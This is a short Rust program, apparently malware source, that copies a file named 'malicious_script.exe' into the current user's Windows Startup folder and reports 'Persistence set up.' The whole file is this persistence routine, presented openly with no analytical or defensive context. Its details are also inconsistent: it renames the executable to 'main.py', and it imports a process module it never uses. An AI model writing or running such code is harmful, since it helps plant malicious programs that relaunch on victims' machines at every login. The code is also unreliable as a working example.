use std::fs;
use std::env;
use std::process::Command;

fn main() {
    let startup_path = env::var("APPDATA").unwrap() + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    let malicious_script_path = env::current_dir().unwrap().display().to_string() + "\\malicious_script.exe";

    fs::copy(malicious_script_path, startup_path + "\\main.py").expect("Failed to copy script to startup");
    println!("Persistence set up.");
}